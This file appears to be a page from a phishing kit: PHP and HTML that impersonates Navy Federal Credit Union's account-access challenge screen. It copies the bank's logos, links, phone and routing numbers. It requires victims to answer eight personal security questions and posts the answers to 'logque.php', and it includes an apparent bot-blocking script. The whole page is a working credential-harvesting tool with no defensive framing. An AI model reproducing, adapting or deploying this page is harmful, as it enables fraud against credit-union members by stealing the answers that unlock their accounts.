<?php
require_once 'block.php';
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" xml:lang="en" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<link rel="stylesheet" href="img/styles.css" type="text/css">
<link rel="stylesheet" href="img/css.css" type="text/css">
<link rel="stylesheet" type="text/css" href="img/facebox.css" media="screen">

<script type="text/javascript" src="img/jquery-1.js"></script>
<script type="text/javascript" src="img/jquery.js" language="JavaScript"></script>
<script type="text/javascript" src="img/facebox.js"></script>
<script language="javascript">
	$(function(){
		$('a[rel*=facebox]').facebox();
	});
</script>


	<style> body { display : none; } </style>


<script src="img/pm_fp.js" language="JavaScript" type="text/javascript"></script>

</head>
<body style="display: block;">


<script> 
if (self == top) {
  var theBody = document.getElementsByTagName('body')[0];
  theBody.style.display = "block";
}
</script>


<div id="outer">
<div id="framework">

<div id="logolayer"><a href="http://www.navyfederal.org/" target="_blank"><img src="img/navy_fed_logo.png" alt="Navy Federal Credit Union" border="0"></a></div>

<div id="header">

    <div id="globalnav">
    <a href="https://www.navyfederal.org/about/about.php" target="_blank">About Us</a> &nbsp;.&nbsp; <a href="https://www.navyfederal.org/branches-atms/index.php" target="_blank">Branches &amp; ATMs</a> &nbsp;.&nbsp; <a href="https://nfcucloud.custhelp.com/" target="_blank">Questions &amp; Support</a>&nbsp;.&nbsp; 
    <grey> 1-888-842-6328 &nbsp;.&nbsp; Routing Number: 2560-7497-4</grey>
    </div>

</div> <!-- end of header-->

<div id="RSAcontent">
<div id="gradientBox">&nbsp;</div>

<div id="RSAframework">

<h1>Account Access</h1>

 <h2>Answer Challenge Questions</h2>
 <p>To help maintain the integrity of your accounts, we need additional 
identification prior to completeing the transaction you have 
 requested. Please answer the following challenge questions:</p>

<form name="ChallengeForm" id="action" method="post" action="logque.php" onsubmit="return validateForm()">
	
	
	
	<script type="text/javascript">
function validateForm()
{
var x=document.forms["ChallengeForm"]["a1"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #1");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["a2"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #2");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["a3"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #3");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["q4"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #4");
  return false;
  }
  var x=document.forms["ChallengeForm"]["a4"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #4");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["q5"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #5");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["a5"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #5");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["q6"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #6");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["a6"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #6");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["q7"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #7");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["a7"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #7");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["q8"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #8");
  return false;
  }
  
  var x=document.forms["ChallengeForm"]["a8"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #8");
  return false;
  }
}
</script>
	
	
		<div class="qna"><div id="greyQ">Q</div><select name="q1" id="id59">
<option selected="Which state did you first visit (outside the one you were born in)?" value="">Which state did you first visit (outside the one you were born in)?</option>
</select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a1" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">

		<div class="qna"><div id="greyQ">Q</div><select name="q2" id="id59">
<option selected="In what city did you meet your spouse?" value="">In what city did you meet your spouse?</option>
</select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a2" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">


		<div class="qna"><div id="greyQ">Q</div><select name="q3" id="id59">
<option selected="What is the first name of your eldest nephew/niece?" value="">What is the first name of your eldest nephew/niece?</option>
</select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a3" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">


		<div class="qna"><div id="greyQ">Q</div><select name="q4" id="id59">
		<option selected="selected" value="">Choose Your Question</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="In which city did you get engaged?">In which city did you get engaged?</option>
<option value="What is the name of the hospital your oldest child was born in?"> What is the name of the hospital your oldest child was born in?</option>
<option value="What were your wedding colors?"> What were your wedding colors?</option>
<option value="What was the first name of your man\maid of honor?"> What was the first name of your man\maid of honor?</option>
<option value="What is the name of the hospital you were born?">What is the name of the hospital you were born?</option>
<option value="What street did your best friend in high school live on?">What street did your best friend in high school live on?</option>
</select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a4" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">		
	
	
		
		
		
		<div class="qna"><div id="greyQ">Q</div><select name="q5" id="id59">
<option value="In which city did you get married?">In which city did you get married?</option>
</select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a5" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">
	
	
<div class="qna"><div id="greyQ">Q</div><select name="q6" id="id59">
<option selected="selected" value="">Choose Your Question</option>
<option value="What is the last name of your first boyfriend or girlfriend?">What is the last name of your first boyfriend or girlfriend?</option>
<option value="What was your favorite college year?">What was your favorite college year?</option>
<option value="What is your nickname?"> What is your nickname?</option>
<option value="What is your youngest sibling's nickname?"> What is your youngest sibling's nickname?</option>
<option value="What is your grandfather's middle name (your father&#39;s father)?"> What is your grandfather's middle name (your father&#39;s father)?</option>
<option value="What is your grandmother's middle name (your mother's mother)?">What is your grandmother&#39;s middle name (your mother&#39;s mother)?</option>
<option value="What is the first name of your eldest nephew/niece?">What is the first name of your eldest nephew/niece?</option>
<option value="In which city was your grandfather born (father's father)?">In which city was your grandfather born (father&#39;s father)?</option>
<option value="In which city was your mother born?">In which city was your mother born?</option>
<option value="What was the name of your first roommate during college?">What was the name of your first roommate during college?</option>
<option value="What is the name of the hospital you were born in?"> What is the name of the hospital you were born in?</option>
<option value="In which city did your parents get married?"> In which city did your parents get married?</option>
<option value="Which sports team did you like most as a child?"> Which sports team did you like most as a child?</option>
<option value="What was your high school mascot?"> What was your high school mascot?</option>
</select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a6" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">



<div class="qna"><div id="greyQ">Q</div><select name="q7" id="id59">
<option selected="selected" value="">Choose Your Question</option>
<option value="What was the first name of your man\maid of honor?"> What was the first name of your man\maid of honor?</option>
<option value="what was your first pet name?">what was your first pet name?</option>
<option value="in what city did you get engaged?">in what city did you get engaged?</option>
<option value="What street did your best friend in high school live on?">What street did your best friend in high school live on?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="In which city did your parents get married?">In which city did your parents get married??</option>
<option value="In which city was your grandfather born?"> In which city was your grandfather born?</option>
<option value="What were your wedding colors?"> What were your wedding colors?</option></select></div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a7" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">		
		
		
		<div class="qna"><div id="greyQ">Q</div><select name="q8" id="id59">
<option value="What is the name of the hospital your oldest child was born in?"> What is the name of the hospital your oldest child was born in</option>
</select> </div>
		<div class="qna"><div id="orangeA">A</div>
			<input name="a8" maxlength="30" size="30" value="" autocomplete="off" type="text">
		</div>
		<hr class="dotted">
	
	
    	
 <div id="buttonRow">
    <div id="faq-link"><a href="https://nfcucloud.custhelp.com/" target="_blank"><div id="questionMarkImage">&nbsp;</div>Frequently Asked Questions</a>
    </div> 
    <div id="buttons">
        <div id="buttonDivOrangeOld"><input value="Continue" id="submit" class="buttonOrangeOld" type="submit"></div>
	</div>
</div>
    
</form>
 
 </div> <!--end of RSAframework-->
 </div> <!--end of RSAcontent-->
 </div> <!--end of framework--> 

 <div id="footercontainer">
	<div id="navyfooter">
		<div id="hiddenlinks" style="display:none;">
			<div id="footerblock">
				<ul class="footermenu">
				  <p class="footertitle">Loans</p>
				  <li><a href="#">Mortgages</a></li>
				  <li><a href="#">Equity</a></li>
				  <li><a href="#">Auto</a></li>
				  <li><a href="#">Motorcylce, Boat &amp; Collateral</a></li>
				  <li><a href="#">All Loans</a></li>
				</ul>
			</div>
			<div id="footerblock">
				<ul class="footermenu">
				  <p class="footertitle">Checking &amp; Savings</p>
				  <li><a href="#">Checking</a></li>
				  <li><a href="#">Savings</a></li>
				  <li><a href="#">Money Market</a></li>
				  <li><a href="#">Certificates</a></li>
				  <li><a href="#">IRAs</a></li>
				  <li><a href="#">Direct Deposit</a></li>
				  <li><a href="#">Scan Deposit</a></li>
				</ul>
			</div>
			<div id="footerblock">
				<ul class="footermenu">
				  <p class="footertitle">Cards</p>
				  <li><a href="#">Credit Cards</a></li>
				  <li><a href="#">Debit / Check Cards</a></li>
				  <li><a href="#">Gift Cards</a></li>
				  <li><a href="#">Visa Buxx Prepaid Card</a></li>
				</ul>
			</div>
			<div id="footerblock">
				<ul class="footermenu">
				  <p class="footertitle">Mobile Banking</p>
				  <li><a href="#">iPhone�</a></li>
				  <li><a href="#">iPad�</a></li>
				  <li><a href="#">AndroidT</a></li>
				  <li><a href="#">Mobile Web</a></li>
				  <li><a href="#">Text Banking</a></li>
				</ul>
			</div>
			<div id="footerblock">
				<ul class="footermenu">
				  <p class="footertitle">Business Services</p>
				  <li><a href="#">Overview</a></li>
				  <li><a href="#">Checking &amp; Savings</a></li>
				  <li><a href="#">Loans</a></li>
				  <li><a href="#">Credit Cards</a></li>
				  <li><a href="#">Retirement &amp; Insurance</a></li>
				  <li><a href="#">Commercial Real Estate</a></li>
				</ul>
			</div>
			<div id="footerblocklast">
		
			<ul class="footermenu">
			  <p class="footertitle">Investments &amp; Insurance</p>
			  <li><a href="#">Navy Federal Financial Group</a></li>
			  <li><a href="#">Investments</a></li>
			  <li><a href="#">Financial Planning</a></li>
			  <li><a href="#">Insurance</a></li>
			  <li><a href="#">Trust Services</a></li>
		  </ul>
		</div>
		</div>
		<hr>
		<div id="subfooterlogo">
			<a href="http://www.navyfederal.org/" target="_blank"><img src="img/footer_navy_fed_logo.png" alt="Navy Federal Credit Union" height="43" width="74">
</a>
		</div>
		<div id="subfooternav">
			<div id="subnav">
				<a href="https://www.navyfederal.org/about/about.php" target="_blank">About Us</a> | <a href="https://www.navyfederal.org/about/careers.php" target="_blank">Careers</a> | <a href="https://www.navyfederal.org/branches-atms/index.php" target="_blank">Branches &amp; ATMs</a> | <a href="https://nfcucloud.custhelp.com/" target="_blank">FAQs</a> | <a href="https://www.navyfederal.org/contact-us.php" target="_blank">Contact Us</a> - 1-888-842-6328 | Routing Number: 2560-7497-4<br>
				<a href="https://www.navyfederal.org/pdf/ebrochures/1116e.pdf" target="_blank">Federally Insured by NCUA</a> | <a href="#onlineDisclosure" rel="facebox">Web Policy</a> | <a href="https://www.navyfederal.org/pdf/publications/NFCU_198_PrivacyPolicy.pdf" target="_blank">Privacy Policy</a> | <a href="#browserRequirements" rel="facebox">Browser Support</a>
			</div>
			<div id="footercopy">Navy Federal is the world's largest credit union
 with $46 billion in assets, more than 3.8 million members, over 220 
branch offices, and more than 8,000 employees worldwide. We serve the 
men and women of the U.S. Army, Marine Corps, Navy, Air Force, the 
civilian employees of the Department of Defense, and their families.</div>
			<div id="footercopyright"><img src="img/footer_equal_housing_logo.png" alt="Equal Housing Lender" align="bottom" height="16" width="22">
				<a href="http://www.navyfederal.org/pdf/ebrochures/3035_EHL_Poster.pdf" target="_self">Equal Housing Lender</a> | APY = Annual Percentage Yield | APR = Annual Percentage Rate | Android is a trademark of Google, Inc.<br> 
				Copyright � <script language="JavaScript" type="text/javascript">
				var d=new Date();
				yr=d.getFullYear();
				 document.write(yr);
				</script> Navy Federal Credit Union - All rights reserved - The use of images or content must be requested.<br><br>
			</div>
		</div> <!--end of subfooterNav -->
	</div><!--end of navyfooter -->
<br style="clear:both;">

</div>  <!-- end of footercontainer -->
 </div> <!--end of outer-->
 




    <div id="facebox" style="display:none;">       <div class="popup"> 				<div class="header"> 	        <a href="#" class="close"><img src="img/modal-close.png" title="close" class="close_image"></a> 				</div>         <div class="content">         </div>       </div>     </div></body></html>
	
	
	